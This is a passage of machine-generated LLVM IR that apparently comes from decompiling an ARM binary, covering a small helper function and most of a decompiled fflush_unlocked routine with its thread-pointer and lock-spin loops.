  uselistorder label %dec_label_pc_16dd0, { 1, 0 }
  uselistorder label %dec_label_pc_16d80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d70, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16d48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d30, { 1, 0 }
  uselistorder label %dec_label_pc_16ce4, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_16cac, { 1, 0 }
  uselistorder label %dec_label_pc_16c80, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_16c70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16c58, { 1, 0 }
  uselistorder label %dec_label_pc_16bf4, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_16be4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16bcc, { 1, 0 }
}

define i32 @function_16e20(i32 %arg1) local_unnamed_addr {
dec_label_pc_16e20:
  %v0_16e20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16e20, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16e20
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16e20, %bb
  %v10_16e34 = phi i32 [ %arg1, %dec_label_pc_16e20 ], [ 0, %bb ]
  ret i32 %v10_16e34

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_16e38 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r6, align 4
  %v4_16e48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 76) to i32*), align 4
  store i32 %v4_16e48, i32* %r3.global-to-local, align 4
  %v4_16e4c = icmp uge i32 %tmp, %v4_16e48
  store i1 %v4_16e4c, i1* %cpsr_c.global-to-local, align 1
  %v10_16e4c = icmp eq i32 %tmp, %v4_16e48
  br i1 %v10_16e4c, label %bb, label %dec_label_pc_16e64

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_16e74

dec_label_pc_16e64:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_16e68 = icmp eq i16* %arg1, null
  br i1 %v3_16e68, label %dec_label_pc_16e74, label %dec_label_pc_17188

dec_label_pc_16e74:                               ; preds = %bb, %dec_label_pc_16e64
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_16e64 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_16e78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 160) to i32*), align 4
  store i32 %v4_16e78, i32* %r5.global-to-local, align 4
  %v0_16e7c = call i32 @__aeabi_read_tp()
  store i32 %v0_16e7c, i32* %r0.global-to-local, align 4
  %v1_16e80 = add i32 %v4_16e78, 8
  %v2_16e80 = inttoptr i32 %v1_16e80 to i32*
  %v3_16e80 = load i32, i32* %v2_16e80, align 4
  store i32 %v3_16e80, i32* %r3.global-to-local, align 4
  %v1_16e84 = add i32 %v0_16e7c, -1168
  store i32 %v1_16e84, i32* %r8.global-to-local, align 4
  %v3_16e88 = icmp uge i32 %v3_16e80, %v1_16e84
  store i1 %v3_16e88, i1* %cpsr_c.global-to-local, align 1
  %v9_16e88 = icmp eq i32 %v3_16e80, %v1_16e84
  br i1 %v9_16e88, label %dec_label_pc_16ed0, label %dec_label_pc_16e90

dec_label_pc_16e90:                               ; preds = %dec_label_pc_16e74
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16e78, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16e9c143 = inttoptr i32 %v4_16e78 to i32*
  %v2_16e9c144 = load i32, i32* %v1_16e9c143, align 4
  store i32 %v2_16e9c144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16ea0146 = icmp eq i32 %v2_16e9c144, 0
  br i1 %v9_16ea0146, label %dec_label_pc_16ea8, label %dec_label_pc_16ec0

dec_label_pc_16ea8:                               ; preds = %dec_label_pc_16e90, %dec_label_pc_16ea8.dec_label_pc_16e9c_crit_edge
  %v0_16ea8147 = phi i32 [ %v1_16ea0.pre, %dec_label_pc_16ea8.dec_label_pc_16e9c_crit_edge ], [ 0, %dec_label_pc_16e90 ]
  store i32 %v0_16ea8147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16eb8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16eb8, label %dec_label_pc_16ebc, label %dec_label_pc_16ea8.dec_label_pc_16e9c_crit_edge

dec_label_pc_16ea8.dec_label_pc_16e9c_crit_edge:  ; preds = %dec_label_pc_16ea8
  %v0_16e9c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16ea0.pre = load i32, i32* @r4, align 4
  %v1_16e9c = inttoptr i32 %v0_16e9c.pre to i32*
  %v2_16e9c = load i32, i32* %v1_16e9c, align 4
  store i32 %v2_16e9c, i32* %r3.global-to-local, align 4
  %v3_16ea0 = icmp uge i32 %v2_16e9c, %v1_16ea0.pre
  store i1 %v3_16ea0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ea0 = icmp eq i32 %v2_16e9c, %v1_16ea0.pre
  br i1 %v9_16ea0, label %dec_label_pc_16ea8, label %dec_label_pc_16ec0

dec_label_pc_16ebc:                               ; preds = %dec_label_pc_16ea8
  %v0_16ebc = load i32, i32* @r4, align 4
  store i32 %v0_16ebc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ec0

dec_label_pc_16ec0:                               ; preds = %dec_label_pc_16e90, %dec_label_pc_16ea8.dec_label_pc_16e9c_crit_edge, %dec_label_pc_16ebc
  %v0_16ec0 = phi i32 [ %v0_16ebc, %dec_label_pc_16ebc ], [ %v2_16e9c144, %dec_label_pc_16e90 ], [ %v2_16e9c, %dec_label_pc_16ea8.dec_label_pc_16e9c_crit_edge ]
  %v1_16ec0 = phi i32 [ %v0_16ebc, %dec_label_pc_16ebc ], [ 0, %dec_label_pc_16e90 ], [ %v1_16ea0.pre, %dec_label_pc_16ea8.dec_label_pc_16e9c_crit_edge ]
  %v3_16ec0 = icmp uge i32 %v0_16ec0, %v1_16ec0
  store i1 %v3_16ec0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ec0 = icmp eq i32 %v0_16ec0, %v1_16ec0
  br i1 %v9_16ec0, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_16ec0
  %v1_16ec4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16ec4, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_16ec0, %bb65
  %v1_16ec8 = xor i1 %v9_16ec0, true
  call void @__pseudo_cond_branch(i1 %v1_16ec8, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_16ecc = load i32, i32* %r8.global-to-local, align 4
  %v1_16ecc = load i32, i32* %r5.global-to-local, align 4
  %v2_16ecc = add i32 %v1_16ecc, 8
  %v3_16ecc = inttoptr i32 %v2_16ecc to i32*
  store i32 %v0_16ecc, i32* %v3_16ecc, align 4
  br label %dec_label_pc_16ed0

dec_label_pc_16ed0:                               ; preds = %dec_label_pc_16e74, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16ed4 = load i32, i32* @r6, align 4
  %v2_16ed4 = add i32 %v0_16ed4, 160
  %v3_16ed4 = inttoptr i32 %v2_16ed4 to i32*
  %v4_16ed4 = load i32, i32* %v3_16ed4, align 4
  store i32 %v4_16ed4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16edc = add i32 %v0_16ed4, 12
  %v3_16edc = inttoptr i32 %v2_16edc to i32*
  %v4_16edc = load i32, i32* %v3_16edc, align 4
  store i32 %v4_16edc, i32* %r2.global-to-local, align 4
  %v1_16ee0 = add i32 %v4_16ed4, 4
  %v2_16ee0 = inttoptr i32 %v1_16ee0 to i32*
  %v3_16ee0 = load i32, i32* %v2_16ee0, align 4
  store i32 %v3_16ee0, i32* %r1.global-to-local, align 4
  %v1_16ee4 = inttoptr i32 %v4_16edc to i32*
  %v2_16ee4 = load i32, i32* %v1_16ee4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ee8 = icmp eq i32 %v3_16ee0, 0
  %v1_16eec = add i32 %v2_16ee4, 1
  store i32 %v1_16eec, i32* %r3.global-to-local, align 4
  store i32 %v1_16eec, i32* %v1_16ee4, align 4
  br i1 %v2_16ee8, label %dec_label_pc_16ef8, label %dec_label_pc_16f58

dec_label_pc_16ef8:                               ; preds = %dec_label_pc_16ed0
  %v0_16ef8 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ef8 = load i32, i32* %r0.global-to-local, align 4
  %v2_16ef8 = add i32 %v1_16ef8, 8
  %v3_16ef8 = inttoptr i32 %v2_16ef8 to i32*
  store i32 %v0_16ef8, i32* %v3_16ef8, align 4
  %v0_16efc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16efc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16f00

dec_label_pc_16f00:                               ; preds = %dec_label_pc_16f30.dec_label_pc_16f00_crit_edge, %dec_label_pc_16ef8
  %v0_16f00 = phi i32 [ %v0_16f00.pre, %dec_label_pc_16f30.dec_label_pc_16f00_crit_edge ], [ %v0_16efc, %dec_label_pc_16ef8 ]
  %v1_16f00 = inttoptr i32 %v0_16f00 to i32*
  %v2_16f00 = load i32, i32* %v1_16f00, align 4
  store i32 %v2_16f00, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16f00, i32* %r2.global-to-local, align 4
  %v2_16f0c131 = load i32, i32* %v1_16f00, align 4
  store i32 %v2_16f0c131, i32* %r3.global-to-local, align 4
  %v3_16f10133 = icmp uge i32 %v2_16f0c131, %v2_16f00
  store i1 %v3_16f10133, i1* %cpsr_c.global-to-local, align 1
  %v9_16f10139 = icmp eq i32 %v2_16f0c131, %v2_16f00
  br i1 %v9_16f10139, label %dec_label_pc_16f18, label %dec_label_pc_16f30

dec_label_pc_16f18:                               ; preds = %dec_label_pc_16f00, %dec_label_pc_16f18.dec_label_pc_16f0c_crit_edge
  %v0_16f18140 = phi i32 [ %v1_16f10.pre, %dec_label_pc_16f18.dec_label_pc_16f0c_crit_edge ], [ %v2_16f00, %dec_label_pc_16f00 ]
  store i32 %v0_16f18140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16f28 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16f28, label %dec_label_pc_16f2c, label %dec_label_pc_16f18.dec_label_pc_16f0c_crit_edge

dec_label_pc_16f18.dec_label_pc_16f0c_crit_edge:  ; preds = %dec_label_pc_16f18
  %v0_16f0c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16f10.pre = load i32, i32* @r4, align 4
  %v1_16f0c = inttoptr i32 %v0_16f0c.pre to i32*
  %v2_16f0c = load i32, i32* %v1_16f0c, align 4
  store i32 %v2_16f0c, i32* %r3.global-to-local, align 4
  %v3_16f10 = icmp uge i32 %v2_16f0c, %v1_16f10.pre
  store i1 %v3_16f10, i1* %cpsr_c.global-to-local, align 1
  %v9_16f10 = icmp eq i32 %v2_16f0c, %v1_16f10.pre
  br i1 %v9_16f10, label %dec_label_pc_16f18, label %dec_label_pc_16f30

dec_label_pc_16f2c:                               ; preds = %dec_label_pc_16f18
  %v0_16f2c = load i32, i32* @r4, align 4
  store i32 %v0_16f2c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f30

dec_label_pc_16f30:                               ; preds = %dec_label_pc_16f00, %dec_label_pc_16f18.dec_label_pc_16f0c_crit_edge, %dec_label_pc_16f2c
  %v0_16f38 = phi i32 [ %v0_16f2c, %dec_label_pc_16f2c ], [ %v2_16f0c131, %dec_label_pc_16f00 ], [ %v2_16f0c, %dec_label_pc_16f18.dec_label_pc_16f0c_crit_edge ]
  %v1_16f30 = phi i32 [ %v0_16f2c, %dec_label_pc_16f2c ], [ %v2_16f00, %dec_label_pc_16f00 ], [ %v1_16f10.pre, %dec_label_pc_16f18.dec_label_pc_16f0c_crit_edge ]
  %v3_16f30 = icmp uge i32 %v0_16f38, %v1_16f30
  store i1 %v3_16f30, i1* %cpsr_c.global-to-local, align 1
  %v9_16f30 = icmp eq i32 %v0_16f38, %v1_16f30
  br i1 %v9_16f30, label %dec_label_pc_16f38, label %dec_label_pc_16f30.dec_label_pc_16f00_crit_edge

dec_label_pc_16f30.dec_label_pc_16f00_crit_edge:  ; preds = %dec_label_pc_16f30
  %v0_16f00.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16f00

dec_label_pc_16f38:                               ; preds = %dec_label_pc_16f30
  %v2_16f38 = icmp ne i32 %v1_16f30, 0
  store i1 %v2_16f38, i1* %cpsr_c.global-to-local, align 1
  %v7_16f3c = icmp slt i32 %v1_16f30, 2
  br i1 %v7_16f3c, label %dec_label_pc_16f58, label %dec_label_pc_16f40

dec_label_pc_16f40:                               ; preds = %dec_label_pc_16f38
  %v0_16f40 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16f40, i32* %r0.global-to-local, align 4
  %v0_16f44 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f44 = add i32 %v0_16f44, 129
  store i32 %v1_16f44, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f58

dec_label_pc_16f58:                               ; preds = %dec_label_pc_16ed0, %dec_label_pc_16f40, %dec_label_pc_16f38
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16f5c = load i32, i32* @r6, align 4
  %v2_16f5c = add i32 %v0_16f5c, 152
  %v3_16f5c = inttoptr i32 %v2_16f5c to i32*
  %v4_16f5c = load i32, i32* %v3_16f5c, align 4
  store i32 %v4_16f5c, i32* %r5.global-to-local, align 4
  %v1_16f60 = add i32 %v4_16f5c, 8
  %v2_16f60 = inttoptr i32 %v1_16f60 to i32*
  %v3_16f60 = load i32, i32* %v2_16f60, align 4
  store i32 %v3_16f60, i32* %r3.global-to-local, align 4
  %v1_16f64 = load i32, i32* %r8.global-to-local, align 4
  %v3_16f64 = icmp uge i32 %v3_16f60, %v1_16f64
  store i1 %v3_16f64, i1* %cpsr_c.global-to-local, align 1
  %v9_16f64 = icmp eq i32 %v3_16f60, %v1_16f64
  br i1 %v9_16f64, label %dec_label_pc_16fac, label %dec_label_pc_16f6c

dec_label_pc_16f6c:                               ; preds = %dec_label_pc_16f58
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16f5c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16f78123 = inttoptr i32 %v4_16f5c to i32*
  %v2_16f78124 = load i32, i32* %v1_16f78123, align 4
  store i32 %v2_16f78124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16f7c126 = icmp eq i32 %v2_16f78124, 0
  br i1 %v9_16f7c126, label %dec_label_pc_16f84, label %dec_label_pc_16f9c

dec_label_pc_16f84:                               ; preds = %dec_label_pc_16f6c, %dec_label_pc_16f84.dec_label_pc_16f78_crit_edge
  %v0_16f84127 = phi i32 [ %v1_16f7c.pre, %dec_label_pc_16f84.dec_label_pc_16f78_crit_edge ], [ 0, %dec_label_pc_16f6c ]
  store i32 %v0_16f84127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16f94 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16f94, label %dec_label_pc_16f98, label %dec_label_pc_16f84.dec_label_pc_16f78_crit_edge

dec_label_pc_16f84.dec_label_pc_16f78_crit_edge:  ; preds = %dec_label_pc_16f84
  %v0_16f78.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16f7c.pre = load i32, i32* @r4, align 4
  %v1_16f78 = inttoptr i32 %v0_16f78.pre to i32*
  %v2_16f78 = load i32, i32* %v1_16f78, align 4
  store i32 %v2_16f78, i32* %r3.global-to-local, align 4
  %v3_16f7c = icmp uge i32 %v2_16f78, %v1_16f7c.pre
  store i1 %v3_16f7c, i1* %cpsr_c.global-to-local, align 1
  %v9_16f7c = icmp eq i32 %v2_16f78, %v1_16f7c.pre
  br i1 %v9_16f7c, label %dec_label_pc_16f84, label %dec_label_pc_16f9c

dec_label_pc_16f98:                               ; preds = %dec_label_pc_16f84
  %v0_16f98 = load i32, i32* @r4, align 4
  store i32 %v0_16f98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f9c

dec_label_pc_16f9c:                               ; preds = %dec_label_pc_16f6c, %dec_label_pc_16f84.dec_label_pc_16f78_crit_edge, %dec_label_pc_16f98
  %v0_16f9c = phi i32 [ %v0_16f98, %dec_label_pc_16f98 ], [ %v2_16f78124, %dec_label_pc_16f6c ], [ %v2_16f78, %dec_label_pc_16f84.dec_label_pc_16f78_crit_edge ]
  %v1_16f9c = phi i32 [ %v0_16f98, %dec_label_pc_16f98 ], [ 0, %dec_label_pc_16f6c ], [ %v1_16f7c.pre, %dec_label_pc_16f84.dec_label_pc_16f78_crit_edge ]
  %v3_16f9c = icmp uge i32 %v0_16f9c, %v1_16f9c
  store i1 %v3_16f9c, i1* %cpsr_c.global-to-local, align 1
  %v9_16f9c = icmp eq i32 %v0_16f9c, %v1_16f9c
  br i1 %v9_16f9c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_16f9c
  %v1_16fa0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16fa0, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_16f9c, %bb67
  %v1_16fa4 = xor i1 %v9_16f9c, true
  call void @__pseudo_cond_branch(i1 %v1_16fa4, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_16fa8 = load i32, i32* %r8.global-to-local, align 4
  %v1_16fa8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16fa8 = add i32 %v1_16fa8, 8
  %v3_16fa8 = inttoptr i32 %v2_16fa8 to i32*
  store i32 %v0_16fa8, i32* %v3_16fa8, align 4
  %v0_16fb0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16fac

dec_label_pc_16fac:                               ; preds = %dec_label_pc_16f58, %bb68
  %v0_16fbc = phi i32 [ %v0_16f5c, %dec_label_pc_16f58 ], [ %v0_16fb0.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16fb0 = add i32 %v0_16fbc, 152
  %v3_16fb0 = inttoptr i32 %v2_16fb0 to i32*
  %v4_16fb0 = load i32, i32* %v3_16fb0, align 4
  store i32 %v4_16fb0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_16fb8 = add i32 %v4_16fb0, 4
  %v2_16fb8 = inttoptr i32 %v1_16fb8 to i32*
  %v3_16fb8 = load i32, i32* %v2_16fb8, align 4
  store i32 %v3_16fb8, i32* %r1.global-to-local, align 4
  %v2_16fbc = add i32 %v0_16fbc, 76
  %v3_16fbc = inttoptr i32 %v2_16fbc to i32*
  %v4_16fbc = load i32, i32* %v3_16fbc, align 4
  store i32 %v4_16fbc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16fc0 = icmp eq i32 %v3_16fb8, 0
  %v1_16fc4 = inttoptr i32 %v4_16fbc to i32*
  %v2_16fc4 = load i32, i32* %v1_16fc4, align 4
  store i32 %v2_16fc4, i32* @r5, align 4
  br i1 %v2_16fc0, label %dec_label_pc_16fcc, label %dec_label_pc_1702c

dec_label_pc_16fcc:                               ; preds = %dec_label_pc_16fac
  %v2_16fcc = add i32 %v4_16fb0, 8
  %v3_16fcc = inttoptr i32 %v2_16fcc to i32*
  store i32 0, i32* %v3_16fcc, align 4
  %v0_16fd0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16fd0, i32* @r7, align 4
  br label %dec_label_pc_16fd4

dec_label_pc_16fd4:                               ; preds = %dec_label_pc_17004.dec_label_pc_16fd4_crit_edge, %dec_label_pc_16fcc
  %v0_16fd4 = phi i32 [ %v0_16fd4.pre, %dec_label_pc_17004.dec_label_pc_16fd4_crit_edge ], [ %v0_16fd0, %dec_label_pc_16fcc ]
  %v1_16fd4 = inttoptr i32 %v0_16fd4 to i32*
  %v2_16fd4 = load i32, i32* %v1_16fd4, align 4
  store i32 %v2_16fd4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16fd4, i32* %r2.global-to-local, align 4
  %v2_16fe0111 = load i32, i32* %v1_16fd4, align 4
  store i32 %v2_16fe0111, i32* %r3.global-to-local, align 4
  %v3_16fe4113 = icmp uge i32 %v2_16fe0111, %v2_16fd4
  store i1 %v3_16fe4113, i1* %cpsr_c.global-to-local, align 1
  %v9_16fe4119 = icmp eq i32 %v2_16fe0111, %v2_16fd4
  br i1 %v9_16fe4119, label %dec_label_pc_16fec, label %dec_label_pc_17004

dec_label_pc_16fec:                               ; preds = %dec_label_pc_16fd4, %dec_label_pc_16fec.dec_label_pc_16fe0_crit_edge
  %v0_16fec120 = phi i32 [ %v1_16fe4.pre, %dec_label_pc_16fec.dec_label_pc_16fe0_crit_edge ], [ %v2_16fd4, %dec_label_pc_16fd4 ]
  store i32 %v0_16fec120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16ffc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16ffc, label %dec_label_pc_17000, label %dec_label_pc_16fec.dec_label_pc_16fe0_crit_edge

dec_label_pc_16fec.dec_label_pc_16fe0_crit_edge:  ; preds = %dec_label_pc_16fec
  %v0_16fe0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16fe4.pre = load i32, i32* @r4, align 4
  %v1_16fe0 = inttoptr i32 %v0_16fe0.pre to i32*
  %v2_16fe0 = load i32, i32* %v1_16fe0, align 4
  store i32 %v2_16fe0, i32* %r3.global-to-local, align 4
  %v3_16fe4 = icmp uge i32 %v2_16fe0, %v1_16fe4.pre
  store i1 %v3_16fe4, i1* %cpsr_c.global-to-local, align 1
  %v9_16fe4 = icmp eq i32 %v2_16fe0, %v1_16fe4.pre
  br i1 %v9_16fe4, label %dec_label_pc_16fec, label %dec_label_pc_17004

dec_label_pc_17000:                               ; preds = %dec_label_pc_16fec
  %v0_17000 = load i32, i32* @r4, align 4
  store i32 %v0_17000, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17004

dec_label_pc_17004:                               ; preds = %dec_label_pc_16fd4, %dec_label_pc_16fec.dec_label_pc_16fe0_crit_edge, %dec_label_pc_17000
  %v0_1700c = phi i32 [ %v0_17000, %dec_label_pc_17000 ], [ %v2_16fe0111, %dec_label_pc_16fd4 ], [ %v2_16fe0, %dec_label_pc_16fec.dec_label_pc_16fe0_crit_edge ]
  %v1_17004 = phi i32 [ %v0_17000, %dec_label_pc_17000 ], [ %v2_16fd4, %dec_label_pc_16fd4 ], [ %v1_16fe4.pre, %dec_label_pc_16fec.dec_label_pc_16fe0_crit_edge ]
  %v3_17004 = icmp uge i32 %v0_1700c, %v1_17004
  store i1 %v3_17004, i1* %cpsr_c.global-to-local, align 1
  %v9_17004 = icmp eq i32 %v0_1700c, %v1_17004
  br i1 %v9_17004, label %dec_label_pc_1700c, label %dec_label_pc_17004.dec_label_pc_16fd4_crit_edge

dec_label_pc_17004.dec_label_pc_16fd4_crit_edge:  ; preds = %dec_label_pc_17004
  %v0_16fd4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16fd4

dec_label_pc_1700c:                               ; preds = %dec_label_pc_17004
  %v2_1700c = icmp ne i32 %v1_17004, 0
  store i1 %v2_1700c, i1* %cpsr_c.global-to-local, align 1
  %v7_17010 = icmp slt i32 %v1_17004, 2
  br i1 %v7_17010, label %dec_label_pc_1702cthread-pre-split, label %dec_label_pc_17014

dec_label_pc_17014:                               ; preds = %dec_label_pc_1700c
  %v0_17014 = load i32, i32* @r7, align 4
  store i32 %v0_17014, i32* %r0.global-to-local, align 4
  %v0_17018 = load i32, i32* %r1.global-to-local, align 4
  %v1_17018 = add i32 %v0_17018, 129
  store i32 %v1_17018, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1702cthread-pre-split

dec_label_pc_1702cthread-pre-split:               ; preds = %dec_label_pc_1700c, %dec_label_pc_17014
  %v0_17178.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_1702c

dec_label_pc_1702c:                               ; preds = %dec_label_pc_1702cthread-pre-split, %dec_label_pc_16fac
  %v0_17178.pr = phi i32 [ %v0_17178.pr.pr, %dec_label_pc_1702cthread-pre-split ], [ %v2_16fc4, %dec_label_pc_16fac ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1717818 = icmp eq i32 %v0_17178.pr, 0
  br i1 %v2_1717818, label %dec_label_pc_17180, label %dec_label_pc_1703c

dec_label_pc_1703c:                               ; preds = %dec_label_pc_1702c, %dec_label_pc_17174
  %v0_17064 = phi i32 [ %v3_17174, %dec_label_pc_17174 ], [ %v0_17178.pr, %dec_label_pc_1702c ]
  %v1_1703c = inttoptr i32 %v0_17064 to i16*
  %v2_1703c = load i16, i16* %v1_1703c, align 2
  %v3_1703c = zext i16 %v2_1703c to i32
  store i32 %v3_1703c, i32* %r3.global-to-local, align 4
  %v1_17040 = and i32 %v3_1703c, 64
  %v2_17040 = icmp eq i32 %v1_17040, 0
  br i1 %v2_17040, label %dec_label_pc_17174, label %dec_label_pc_17048

dec_label_pc_17048:                               ; preds = %dec_label_pc_1703c
  %v0_17048 = load i32, i32* @r6, align 4
  %v1_17048 = load i32, i32* %sb.global-to-local, align 4
  %v2_17048 = add i32 %v1_17048, %v0_17048
  %v3_17048 = inttoptr i32 %v2_17048 to i32*
  %v4_17048 = load i32, i32* %v3_17048, align 4
  store i32 %v4_17048, i32* %r3.global-to-local, align 4
  %v1_1704c = inttoptr i32 %v4_17048 to i32*
  %v2_1704c = load i32, i32* %v1_1704c, align 4
  store i32 %v2_1704c, i32* %r3.global-to-local, align 4
  %v2_17050 = icmp ugt i32 %v2_1704c, 1
  store i1 %v2_17050, i1* %cpsr_c.global-to-local, align 1
  %v7_17050 = icmp eq i32 %v2_1704c, 2
  br i1 %v7_17050, label %dec_label_pc_170b4, label %dec_label_pc_17058

dec_label_pc_17058:                               ; preds = %dec_label_pc_17048
  %v1_17058 = add i32 %v0_17064, 64
  %v2_17058 = inttoptr i32 %v1_17058 to i32*
  %v3_17058 = load i32, i32* %v2_17058, align 4
  store i32 %v3_17058, i32* %r3.global-to-local, align 4
  %v1_1705c = load i32, i32* %r8.global-to-local, align 4
  %v3_1705c = icmp uge i32 %v3_17058, %v1_1705c
  store i1 %v3_1705c, i1* %cpsr_c.global-to-local, align 1
  %v9_1705c = icmp eq i32 %v3_17058, %v1_1705c
  br i1 %v9_1705c, label %dec_label_pc_170a8, label %dec_label_pc_17064

dec_label_pc_17064:                               ; preds = %dec_label_pc_17058
  %v1_17064 = add i32 %v0_17064, 56
  store i32 %v1_17064, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_17064, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1707486 = inttoptr i32 %v1_17064 to i32*
  %v2_1707487 = load i32, i32* %v1_1707486, align 4
  store i32 %v2_1707487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1707894 = icmp eq i32 %v2_1707487, 0
  br i1 %v9_1707894, label %dec_label_pc_17080, label %dec_label_pc_17098

dec_label_pc_17080:                               ; preds = %dec_label_pc_17064, %dec_label_pc_17080.dec_label_pc_17074_crit_edge
  %v0_1708095 = phi i32 [ %v1_17078.pre, %dec_label_pc_17080.dec_label_pc_17074_crit_edge ], [ 0, %dec_label_pc_17064 ]
  store i32 %v0_1708095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17090 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17090, label %dec_label_pc_17094, label %dec_label_pc_17080.dec_label_pc_17074_crit_edge

